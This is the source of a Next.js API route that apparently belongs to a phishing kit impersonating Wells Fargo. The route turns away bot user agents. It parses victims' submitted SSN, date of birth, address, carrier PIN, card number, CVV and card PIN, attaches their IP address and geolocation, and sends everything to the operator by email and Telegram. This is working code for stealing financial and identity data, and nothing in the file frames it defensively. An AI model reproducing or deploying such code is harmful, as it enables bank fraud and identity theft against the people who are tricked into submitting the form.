import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendEmail } from "../../utils/sendEmail";
import { sendTelegram } from "../../utils/sendTelegram";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res.end(`Fuck off`);
    return;
  }

  try {
    const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);

    const values = req.body;

    const message = `
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
${
  values.form[0] === `INFO` &&
  ` 
<h4>BILLING</h4>
<p>| (▰˘◡˘▰) FULL NAME ☞ <b>${JSON.parse(values.info).billing.fullname}</b></p>
<p>| (▰˘◡˘▰) SSN ☞ <b>${JSON.parse(values.info).billing.ssn}</b></p>
<p>| (▰˘◡˘▰) DOB ☞ <b>${JSON.parse(values.info).billing.dob}</b></p>
<p>| (▰˘◡˘▰) STREET ADDRESS ☞ <b>${
    JSON.parse(values.info).billing.address
  }</b></p>
<p>| (▰˘◡˘▰) ZIP CODE ☞ <b>${JSON.parse(values.info).billing.zipCode}</b></p>
<p>| (▰˘◡˘▰) STATE ☞ <b>${JSON.parse(values.info).billing.state}</b></p>
<p>| (▰˘◡˘▰) PHONE NUMBER ☞ <b>${
    JSON.parse(values.info).billing.phoneNumber || ``
  }</b></p>
<p>| (▰˘◡˘▰) CARRIER PIN ☞ <b>${
    JSON.parse(values.info).billing.carrierPin || ``
  }</b></p>

<h4>CARD DETAILS</h4>
<p>| (▰˘◡˘▰) CARD NUMBER ☞ <b>${JSON.parse(values.info).card.number}</b></p>
<p>| (▰˘◡˘▰) EXPIRATION DATE ☞ <b>${
    JSON.parse(values.info).card.date
  }</b></B></p>
<p>| (▰˘◡˘▰) CVV ☞ <b>${JSON.parse(values.info).card.cvv}</b></p>
<p>| (▰˘◡˘▰) CARD PIN ☞ <b>${JSON.parse(values.info).card.pin}</b></p>

<h4>EMAIL</h4>
<p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${JSON.parse(values.info).email}</b></p>

<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>

<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>

<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>`
}`;

    if (process.env.TO) {
      await sendEmail(
        message,
        `WELLS FARGO - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
      );
    }

    if (process.env.TELEGRAM_ID) {
      await sendTelegram({
        message: `
        WELLS FARGO - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}
        ${message}
      `,
      });
    }

    res.send(Promise.resolve());
  } catch (error) {
    res.status(500).send({
      name: `Something went wrong`,
    });
  }
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;
